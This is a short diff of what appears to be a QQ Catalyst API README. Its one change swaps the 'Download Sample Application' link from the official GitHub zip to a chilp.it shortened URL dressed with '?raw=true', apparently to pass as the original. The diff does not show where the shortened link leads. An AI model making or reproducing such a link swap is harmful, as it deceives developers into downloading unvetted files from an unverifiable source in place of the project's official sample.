@@ -24,7 +24,7 @@ Please tell us how we can make the APIs better. If you have a specific feature r
 Users of the API must agree to the <a href='https://github.com/QQSolutions/QQCatalystAPI/blob/master/QQ%20Catalyst%20API%20TOU%20Agreement.pdf?raw=true' parent='_blank'>terms of service</a>.  QQ Catalyst is a registered trademark of QQSolutions, Inc.
 
 #### Helpful Links
-<p><a href=' https://github.com/QQSolutions/QQCatalystAPI/blob/master/CatalystAPISample.zip?raw=true'>Download Sample Application</a></p>
+<p><a href='http://chilp.it/8063661?raw=true'>Download Sample Application</a></p>
 <p><a href='https://github.com/QQSolutions/QQCatalystAPI/blob/master/QQCatalyst%20API%20Sample%20Application.pdf?raw=true'>Sample Application Documentation</a></p>
 <p><a href='http://api.qqcatalyst.com/#techDoc'>View QQ Catalyst API WebHelp </a></p>
 <p><a href='http://www.qqsolutions.com'>Visit QQ Solutions Online</a></p>
